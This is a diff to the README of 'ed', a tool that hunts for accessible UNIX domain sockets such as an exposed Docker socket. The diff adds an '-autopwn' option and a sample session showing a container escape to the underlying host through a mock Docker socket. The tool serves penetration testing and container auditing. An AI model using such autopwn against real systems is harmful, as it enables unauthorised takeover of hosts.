@@ -1,8 +1,8 @@
 # ed
-Ed is a tool used to identify accessible UNIX Domain Sockets
+Ed is a tool used to identify and exploit accessible UNIX Domain Sockets
 
 # What does it do?
-Ed is a binary to help you find accessible UNIX domain sockets on a container or host. This is useful for hunting Docker.sock when it has been mounted to a non-default location and or not mounted with the defualt name i.e  "/var/run/Docker.sock".
+Ed is a binary to help you find and exploit accessible UNIX domain sockets on a container or host. This is useful for hunting Docker.sock when it has been mounted to a non-default location and or not mounted with the default name i.e  "/var/run/Docker.sock".
 
 # Why ed?
 Finding exposed UNIX domain sockets, especially Docker.sock, is very useful ;) Ed can be useful in a DevOps process to ensure that Containers do not have any unnecessarily exposed sockets.
@@ -14,10 +14,16 @@ Ed can be used to look for plain 'ol UNIX domain sockets, UNIX domain sockets th
   ./ed -h
 [+] Hunt 'dem Socks
 Usage of ./ed:
+  -autopwn
+        Attempt to autopwn exposed sockets
   -docker
         Hunt for docker.sock
   -http
         Hunt for Available UNIX Domain Sockets with HTTP
+  -interfaces
+        Display available network interfaces
+  -json
+        Return output in JSON format
   -path string
         Path to Start Scanning for UNIX Domain Sockets (default ".")
   -socket
@@ -26,6 +32,27 @@ Usage of ./ed:
         Verbose output
 
 ```
+
+Example: Autopwn exposed Docker Domain Socket
+
+```
+root@2ae7f389d44c:/app# ./ed -path=/ -autopwn=true
+[+] Hunt 'dem Socks
+[+] Hunting Down UNIX Domain Sockets from: /
+[*] Valid Socket: /tmp/docker.mock
+[+] Attempting to autopwn
+[+] Hunting Docker Socks
+[+] Attempting to Autopwn:  /tmp/docker.mock
+[*] Getting Docker client...
+[*] Successfully got Docker client...
+[+] Attempting to escape to host...
+You are now on the underlying host
+/ # 
+/ # exit
+[*] Successfully exited TTY
+[+] Finished
+```
+
  Example: Look for exposed Docker.sock
  
  ```
